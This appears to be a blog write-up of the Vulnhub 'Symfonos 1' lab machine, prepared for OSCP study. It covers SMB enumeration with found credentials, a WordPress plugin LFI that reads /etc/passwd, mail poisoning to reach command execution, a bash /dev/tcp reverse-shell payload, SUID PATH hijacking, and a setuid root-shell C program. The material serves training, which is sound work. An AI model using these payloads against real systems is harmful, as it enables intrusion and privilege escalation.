@@ -1,0 +1,76 @@
+<!doctype html><html lang=en><head><title>Vulnhub: Symfonos 1 :: ikuamike</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=keywords content=","><meta name=robots content="noodp"><link rel=canonical href=https://blog.ikuamike.io/posts/2021/symfonos1/><link rel=stylesheet href=https://blog.ikuamike.io/assets/style.css><link rel=stylesheet href=https://blog.ikuamike.io/assets/green.css><link rel=stylesheet href=https://blog.ikuamike.io/style.css><link rel=apple-touch-icon href=https://blog.ikuamike.io/img/apple-touch-icon-192x192.png><link rel="shortcut icon" href=https://blog.ikuamike.io/img/favicon/green.png><meta name=twitter:card content="summary"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Vulnhub: Symfonos 1"><meta property="og:description" content><meta property="og:url" content="https://blog.ikuamike.io/posts/2021/symfonos1/"><meta property="og:site_name" content="ikuamike"><meta property="og:image" content="https://blog.ikuamike.io/"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2021-01-22 00:00:00 +0000 UTC"></head><body class=green><div class="container center headings--one-size"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>> cd ~</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li><ul class=menu__sub-inner><li class=menu__sub-inner-more-trigger>Show more ▾</li><ul class="menu__sub-inner-more hidden"><li><a href=/webinars>Webinars</a></li></ul></ul></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li><li><a href=/webinars>Webinars</a></li></ul></nav></header><div class=content><div class=post><h1 class=post-title><a href=https://blog.ikuamike.io/posts/2021/symfonos1/>Vulnhub: Symfonos 1</a></h1><div class=post-meta><span class=post-date>2021-01-22</span></div><span class=post-tags>#<a href=https://blog.ikuamike.io/tags/beginner/>Beginner</a>&nbsp;
+#<a href=https://blog.ikuamike.io/tags/vulnhub/>Vulnhub</a>&nbsp;
+#<a href=https://blog.ikuamike.io/tags/oscp-prep/>OSCP Prep</a>&nbsp;
+#<a href=https://blog.ikuamike.io/tags/wordpress/>Wordpress</a>&nbsp;
+#<a href=https://blog.ikuamike.io/tags/lfi/>LFI</a>&nbsp;
+#<a href=https://blog.ikuamike.io/tags/suid/>SUID</a>&nbsp;</span><div class=post-content><div><img src=/img/symfonos1/symfonos1.png alt=symfonos1 class=center style=border-radius:8px><table><thead><tr><th>Difficulty</th><th>Release Date</th><th>Author</th><th>Machine link</th></tr></thead><tbody><tr><td>Beginner</td><td>29 June 2019</td><td>Zayotic</td><td><a href=https://vulnhub.com/entry/symfonos-1,322/>https://vulnhub.com/entry/symfonos-1,322/</a></td></tr></tbody></table><h1 id=summary>Summary<a href=#summary class=hanchor arialabel=Anchor>&#8983;</a></h1><p>I got an OSCP voucher last year and this is my active effort to prep for it using TJ-Null&rsquo;s OSCP
+Prep list. Hopefully documenting this will help improve my methodology and get me ready for OSCP and beyond.</p><p>In this box, initial access is through lfi to rce by using sending a payload in mail and accessing it.For privilege
+escalation we exploit a setuid binary that doesn&rsquo;t use absolute paths, therefore hijacking the path gives us root.</p><h1 id=reconnaissance>Reconnaissance<a href=#reconnaissance class=hanchor arialabel=Anchor>&#8983;</a></h1><p>I already have the IP of the box.</p><p>Nmap output:</p><pre><code>Nmap scan report for 192.168.191.128
+Host is up (0.00025s latency).
+
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey:
+|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
+|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
+|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
+25/tcp  open  smtp        Postfix smtpd
+|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,
+| ssl-cert: Subject: commonName=symfonos
+| Subject Alternative Name: DNS:symfonos
+| Not valid before: 2019-06-29T00:29:42
+|_Not valid after:  2029-06-26T00:29:42
+|_ssl-date: TLS randomness does not represent time
+80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
+Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h59m59s, deviation: 3h27m50s, median: 0s
+|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb-os-discovery:
+|   OS: Windows 6.1 (Samba 4.5.16-Debian)
+|   Computer name: symfonos
+|   NetBIOS computer name: SYMFONOS\x00
+|   Domain name: \x00
+|   FQDN: symfonos
+|_  System time: 2021-01-21T13:48:08-06:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2021-01-21T19:48:08
+|_  start_date: N/A
+</code></pre><h1 id=enumeration>Enumeration<a href=#enumeration class=hanchor arialabel=Anchor>&#8983;</a></h1><h2 id=samba-139445>Samba (139/445)<a href=#samba-139445 class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Using enum4linux-ng we get 2 pieces of useful information.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>enum4linux-ng.py -A 192.168.191.128:
+
+</code></pre></div><p>A user <strong>helios</strong> is discovered</p><img src=/img/symfonos1/symfonos2.png alt=symfonos1 class=center style=border-radius:8px><p>and the <strong>anonymous</strong> share is accessible without credentials.</p><img src=/img/symfonos1/symfonos3.png alt=symfonos1 class=center style=border-radius:8px><p>Using smbclient to access the share, there is a txt file.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>smbclient <span style=color:#ae81ff>\\\\</span>192.168.191.128<span style=color:#ae81ff>\\</span>anonymous -N
+</code></pre></div><img src=/img/symfonos1/symfonos4.png alt=symfonos1 class=center style=border-radius:8px><p>Looking at the contents of attention.txt:</p><img src=/img/symfonos1/symfonos5.png alt=symfonos1 class=center style=border-radius:8px><p>Now we have a username and possible passwords. The combination <strong>helios:qwerty</strong> works and we can access
+the helios share.</p><p>We get access to more txt files, but only the todo.txt has valuable information.</p><img src=/img/symfonos1/symfonos6.png alt=symfonos1 class=center style=border-radius:8px><p>It gives an endpoint,that we can access on the webserver.</p><img src=/img/symfonos1/symfonos7.png alt=symfonos1 class=center style=border-radius:8px><h2 id=http-80>HTTP (80)<a href=#http-80 class=hanchor arialabel=Anchor>&#8983;</a></h2><p>When we access the endpoint we end up on a wordpress instance.</p><img src=/img/symfonos1/symfonos8.png alt=symfonos1 class=center style=border-radius:8px><p>After enumeration using wpscan, 2 plugins are discovered to be vulnerable to unauthenticated LFI.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>wpscan --url http://symfonos.local/h3l105/ -e ap,at,tt,cb,dbe,u -o wpscan.out --api-token <span style=color:#f92672>[</span>redacted<span style=color:#f92672>]</span>
+</code></pre></div><ol><li>mail-masta 1.0:</li></ol><img src=/img/symfonos1/symfonos9.png alt=symfonos1 class=center style=border-radius:8px><ol start=2><li>site-editor 1.1.1</li></ol><img src=/img/symfonos1/symfonos10.png alt=symfonos1 class=center style=border-radius:8px><p>Using the PoC available on exploitdb: <a href=https://www.exploit-db.com/exploits/40290/>https://www.exploit-db.com/exploits/40290/</a> , we can craft this url
+to read files such as /etc/passwd:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>curl http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl<span style=color:#f92672>=</span>/etc/passwd
+</code></pre></div><img src=/img/symfonos1/symfonos11.png alt=symfonos1 class=center style=border-radius:8px><h1 id=getting-shell-as-helios---lfi-to-rce>Getting shell as helios - LFI to RCE<a href=#getting-shell-as-helios---lfi-to-rce class=hanchor arialabel=Anchor>&#8983;</a></h1><p>A typical method to escalate to RCE using LFI is poisoning log files but I wasn&rsquo;t able to load any log
+file to use this method.
+With the presence of port 25 we can try sending an email and try accessing the email using LFI.</p><p>Sending email with payload:</p><img src=/img/symfonos1/symfonos12.png alt=symfonos1 class=center style=border-radius:8px><p>Visiting the mails for user helios in /var/mail/helios gives access to the poisoned file and we can run commands.</p><pre><code class=language-url data-lang=url>http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;cmd=whoami
+</code></pre><img src=/img/symfonos1/symfonos13.png alt=symfonos1 class=center style=border-radius:8px><p>Now we can get a reverse shell using this payload:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>/bin/bash -c <span style=color:#e6db74>&#34;/bin/bash -i &gt;%26 /dev/tcp/192.168.191.1/9000 0&gt;%261 %26&#34;</span>
+</code></pre></div><h1 id=privilege-escalation>Privilege Escalation<a href=#privilege-escalation class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Usual enumeration for privilege escalation involves looking for suid binaries by using find.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>find / -perm -4000 2&gt;/dev/null
+</code></pre></div><p>The binary statuscheck isn&rsquo;t among the linux default ones.</p><img src=/img/symfonos1/symfonos14.png alt=symfonos1 class=center style=border-radius:8px><p>After running it and then running strings against it, it calls the curl command when executed.</p><img src=/img/symfonos1/symfonos15.png alt=symfonos1 class=center style=border-radius:8px><p>Since it doesn&rsquo;t use the absolute path we can abuse this by setting our own PATH and make it call our own custom
+curl command.</p><p>In my custom curl script I get a copy of bash and give it suid permissions:</p><img src=/img/symfonos1/symfonos16.png alt=symfonos1 class=center style=border-radius:8px><h3 id=rooted>Rooted<a href=#rooted class=hanchor arialabel=Anchor>&#8983;</a></h3><img src=/img/symfonos1/symfonos17.png alt=symfonos1 class=center style=border-radius:8px><h1 id=extras>Extras<a href=#extras class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Better way to handle the sending email part using sendEmail:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>sendEmail -t root@symfonos.localdomain -f test@sendEmailtest.com -s 192.168.191.128:25 -u <span style=color:#e6db74>&#34;Test Subject&#34;</span> -m <span style=color:#e6db74>&#34;Test Message&#34;</span> -o tls<span style=color:#f92672>=</span>no
+</code></pre></div><p>Better suid exploit, compiling a c program that correctly sets the uid and gid as root.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span><span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e></span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(){
+    setgid(<span style=color:#ae81ff>0</span>); 
+    setuid(<span style=color:#ae81ff>0</span>);
+    execl(<span style=color:#e6db74>&#34;/bin/bash&#34;</span>,<span style=color:#e6db74>&#34;/bin/bash&#34;</span>,<span style=color:#ae81ff>0</span>);
+}
+</code></pre></div><p>Reason why sending mails addressed to other users drops all the mails to helios is because of aliases set in postfix: /etc/postfix/main.cf</p><img src=/img/symfonos1/symfonos18.png alt=symfonos1 class=center style=border-radius:8px><p>You can reach/follow me on Twitter if you have some feedback or questions.</p><p>Twitter: <a href=https://twitter.com/ikuamike target=_blank rel=noopener>ikuamike</a></p><p>Github: <a href=https://github.com/ikuamike target=_blank rel=noopener>ikuamike</a></p></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://blog.ikuamike.io/posts/2021/symfonos2/><span class=button__icon>←</span>
+<span class=button__text>Vulnhub: Symfonos 2</span></a></span>
+<span class="button next"><a href=https://blog.ikuamike.io/posts/2020/metasploitctf2020/><span class=button__text>Metasploit Community CTF December 2020 WriteUp</span>
+<span class=button__icon>→</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user"><span>© Michael Ikua</span>
+<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://blog.ikuamike.io/assets/main.js></script><script src=https://blog.ikuamike.io/assets/prism.js></script></div></body></html>
